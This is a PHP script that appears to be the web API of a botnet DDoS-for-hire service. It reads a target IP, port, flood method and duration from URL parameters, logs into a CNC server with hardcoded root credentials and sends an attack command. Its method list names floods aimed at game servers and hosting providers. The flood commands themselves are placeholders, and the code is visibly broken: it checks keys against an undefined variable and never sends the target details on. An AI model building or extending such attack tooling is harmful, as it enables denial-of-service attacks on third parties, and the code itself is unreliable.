<?php

    /*
    API For CNC Server
    Change Variables For Server
    A basic query for this to work would be attack.php?key=MYKEYS&target=1.1.1.1&port=22&method=TCP&for=100
    */

    // Server Information NEED TO CONNECT TO YOUR CNC SERVER SO MAKE SURE THIS IS ALL CORRECT
    $server = "1.1.1.1";
    $serverport = 22;
    $username = "root";
    $password = "toor";

    // Get querys
    $key = $_GET['key'];
    $target = $_GET['target'];
    $port = $_GET['port'];
    $method = $_GET['method'];
    $for = $_GET['for'];

    // Change the arrays to your API Keys and botnets methods
    $basicKey = array("MYKEYS", "STILLMINE", "putyourkeyshere");
    $methodTypes = array("TCP", "TCP-X", "UDP", "HOME", "HOME-X", "100UP-BYPASS", "OVH-KILL", "SYN", "SYN-KILL", "NFO", "KILLALL", "FIVM-DROP", "ROBLOX", "APEX", "FN", "R6");
    $maxPort = 65535;

    $run;
    

    // Check that the data sent in URL is not empty or invalid
    if(!$key || empty($key))
    {
        return die("No key was specified");
    }

    if(!$target || empty($target))
    {
        return die("No target was specified");
    }

    if(!$port || empty($port))
    {
        return die("No port was specified");
    }

    if(!$method || empty($method))
    {
        return die("No method was specified");
    }

    if(!$for || empty($for))
    {
        return die("You didnt say how long for");
    }
    

    // Check if keys are right and method is ok
    if(!in_array($key, $validKeys))
    {
        return die("Invalid Key");
    }

    if(!in_array($method, $methodTypes))
    {
        return die("Invalid method");
    }


    // Makes sure the port is a integar value and does not go above the max port
    if(filter_var($port, FILTER_VALIDATE_INT) == false || $port > $maxPort)
    {
        return die("Not a valid port");
    }

    if(filter_var($for, FILTER_VALIDATE_INT) == false)
    {
        return die("Invalid format");
    }

    // If the method is this then run this script put run as the script 
    if($method == "TCP") { $run = "YO MAMA"; }
    else if($method == "TCP-X") { $run = "RUN THE SCRIPT ON YOUR BOTNET"; }
    else if($method == "UDP") { $run = "RUN THE SCRIPT ON YOUR BOTNET"; }
    else if($method == "HOME") { $run = "RUN THE SCRIPT ON YOUR BOTNET"; }
    else if($method == "HOME-X") { $run = "RUN THE SCRIPT ON YOUR BOTNET"; }
    else if($method == "100UP-BYPASS") { $run = "RUN THE SCRIPT ON YOUR BOTNET"; }
    else if($method == "OVH-KILL") { $run = "RUN THE SCRIPT ON YOUR BOTNET"; }
    else if($method == "SYN") { $run = "RUN THE SCRIPT ON YOUR BOTNET"; }
    else if($method == "SYN-KILL") { $run = "RUN THE SCRIPT ON YOUR BOTNET"; }
    else if($method == "NFO") { $run = "RUN THE SCRIPT ON YOUR BOTNET"; }
    else if($method == "KILLALL") { $run = "RUN THE SCRIPT ON YOUR BOTNET"; }
    else if($method == "FIVM-DROP") { $run = "RUN THE SCRIPT ON YOUR BOTNET"; }
    else if($method == "ROBLOX") { $run = "RUN THE SCRIPT ON YOUR BOTNET"; }
    else if($method == "APEX") { $run = "RUN THE SCRIPT ON YOUR BOTNET"; }
    else if($method == "FN") { $run = "RUN THE SCRIPT ON YOUR BOTNET"; }
    else if($method == "R6") { $run = "RUN THE SCRIPT ON YOUR BOTNET"; }

    // Try connecting to the server and its port
    $connect = fsockopen($server, $serverport);

    // If cant connect then throw error
    if(!$connect) 
    {
        return die("Cannot connect to server");
    }
    
    // Inputs Username
    fwrite($connect, $username);
    sleep(1);
    // And password
    fwrite($connect, $password);
    sleep(1);

    // Then runs the script
    fwrite($connect, $run);

    // Saying everything was ok
    echo "<h1 style='text-align: center'>Attack Sent</h1>";

    echo "<h2 style='text-align: center'>
    Target: $target <br>
    Port: $port <br>
    Method: $method <br>
    For: $for <br>
    "
    
?>
